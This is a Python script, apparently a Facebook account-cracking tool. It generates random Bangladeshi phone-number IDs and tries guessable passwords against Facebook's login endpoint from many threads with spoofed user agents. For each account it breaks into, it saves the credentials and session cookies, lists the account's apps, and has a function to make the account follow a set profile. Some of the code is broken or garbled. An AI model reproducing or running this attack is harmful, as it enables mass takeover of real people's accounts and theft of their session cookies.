# fucked by Bunny 🥴
# EHC দেখি সব ওপেন সোর্স ইউজার
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ("""
       \x1b[38;5;196m╔═════════════════════════════════╗
       \x1b[38;5;196m║\033[38;5;46m88888888888  .888888. 88888888888\x1b[38;5;196m║\x1b[38;5;196m
       \x1b[38;5;196m║\033[38;5;46m    888     8888  8888    888    \x1b[38;5;196m║\x1b[38;5;196m
       \x1b[38;5;196m║\033[38;5;46m    888     8888.         888    \x1b[38;5;196m║\x1b[38;5;196m
       \x1b[38;5;196m║\033[38;5;46m    888      "88888.      888    \x1b[38;5;196m║\x1b[38;5;196m
       \x1b[38;5;196m║\033[38;5;46m    888         "8888.    888    \x1b[38;5;196m║\x1b[38;5;196m
       \x1b[38;5;196m║\033[38;5;46m    888           "888    888    \x1b[38;5;196m║\x1b[38;5;196m
       \x1b[38;5;196m║\033[38;5;46m    888     8888  8888    888    \x1b[38;5;196m║\x1b[38;5;196m
       \x1b[38;5;196m║\033[38;5;46m    888      "888888"     888    \x1b[38;5;196m║\x1b[38;5;196m
       \x1b[38;5;196m╚═════════════════════════════════╝
\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗧𝗔𝗥𝗔𝗞𝄟⃝  \x1b[38;5;196m╔══════════════════╗
\x1b[38;5;196m║\033[38;5;46m[𝗧]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑    \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗧𝗔𝗥𝗔𝗞𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝗧𝗔𝗥𝗔𝗞             \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗔]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗧𝗔𝗥𝗔𝗞𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝗧𝗮𝗿𝗮𝗸 𝗛𝗼𝘀𝘀𝗲𝗻      \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗥]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗧𝗔𝗥𝗔𝗞𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝟬𝟭𝟵𝟴𝟳𝟴𝟰𝟰𝟱𝟭𝟱       \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗔]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗧𝗔𝗥𝗔𝗞𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝗧𝗮𝗿𝗮𝗸 𝘃𝗶𝗮         \x1b[38;5;196m║
\x1b[38;5;196m║\033[38;5;46m[𝗞]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗧𝗔𝗥𝗔𝗞𝄟⃝  \x1b[38;5;196m║\033[38;5;46m𝟬𝟭𝟵𝟴𝟳𝟴𝟰𝟰𝟱𝟭𝟱     \x1b[38;5;196m  ║
\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗧𝗔𝗥𝗔𝗞𝄟⃝  \x1b[38;5;196m╚══════════════════╝\033[00m\033[1;30m""")
def linex():
	print('\033[1;93m ')
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :shanto = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :shanto = '√ 2009'
        elif uid[:8] in ['10000000']        :shanto = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:shanto = ' 2010'
        elif uid[:6] in ['100001']          :shanto = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :shanto = '√ 2011/2012'
        elif uid[:6] in ['100004']          :shanto = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :shanto = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :shanto = '√ 2014/2015'
        elif uid[:6] in ['100009']          :shanto = '√ 2015'
        elif uid[:5] in ['10001']           :shanto = '√ 2015/2016'
        elif uid[:5] in ['10002']           :shanto = '√ 2016/2017'
        elif uid[:5] in ['10003']           :shanto = '√ 2018/2019'
        elif uid[:5] in ['10004']           :shanto = '√ 2019/2020'
        elif uid[:5] in ['10005']           :shanto = '√ 2020'
        elif uid[:5] in ['10006','10007','']:shanto = '√ 2021'
        elif uid[:5] in ['10008']           :shanto = '√ 2022'
        elif uid[:5] in ['10009']           :shanto = '√ 2023'
        else:shanto=''
    elif len(uid) in [9,10]:
        shanto = ' √ 2008/2009'
    elif len(uid)==8:
        shanto = '√ 2007/2008'
    elif len(uid)==7:
        shanto = '√ 2006/2007'
    else:shanto=''
    return shanto
    
    
    
# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[1;91m[\033[1;97m❤️\033[1;91m]\033[1;92m Example : {xr}019,017,018,92302,92301,91778{x}')
    print(" \033[1;93m ")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' \033[1;91m[\033[1;97m❤️\033[1;91m]\033[1;92m Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m[\033[1;97m❤️\033[1;91m]\033[1;92m EXAMPLE : 3000, 5000,10000,30000\n \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××× \n \033[1;91m[\033[1;97m🍑\033[1;91m]\033[1;92m PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"\033[1;91m[\033[1;97m❤️\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(f' \033[1;91m[\033[1;97m❤️\033[1;91m]\033[1;94m TOTAL IDS: {xr}'+tl)
        print(f'{x} \033[1;91m[\033[1;97m❤️\033[1;91m]\033[1;94m THE PROCESS HAS BEEN STARTED')
        print(f' \033[1;91m[\033[1;97m❤️\033[1;91m]\033[1;94m WORK CUNTRY \033[1;97m: \033[1;96mBANGLADESH')
        print(f' \033[1;91m[\033[1;97m❤️\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m 𝗧𝗔𝗥𝗔𝗞')
        print(f' \033[1;91m[\033[1;97m❤️\033[1;91m]\033[1;94m USE NETWORK  \033[1;97m:  \033[1;96m2G,3G,4G,5G ')
        print(f' \033[1;91m[\033[1;97m❤️\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print(f" \033[1;93m")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} \033[1;93m")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'p.facebook.com',
            "method": 'POST',
            "scheme": 'https',
            "accept": 'application/x-www-form-urlencoded',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://p.facebook.com/',
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'empty',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                create_audio("Baby Congratulations ,I got a ok id","test1181.mp3")
                print('\r\r\033[1;32m [TARAK-OK🖤] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/TARAK -OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
              # print('\r\r\33[1;31m [TARAK-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/TARAK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['TARAK ','TARAK ','TARAK'])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','🙆','🌺','🌸','🏵️','🍁','🌼','🔥','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}TARAK❤️‍🔥\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}TARAK-KING{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

xxr()
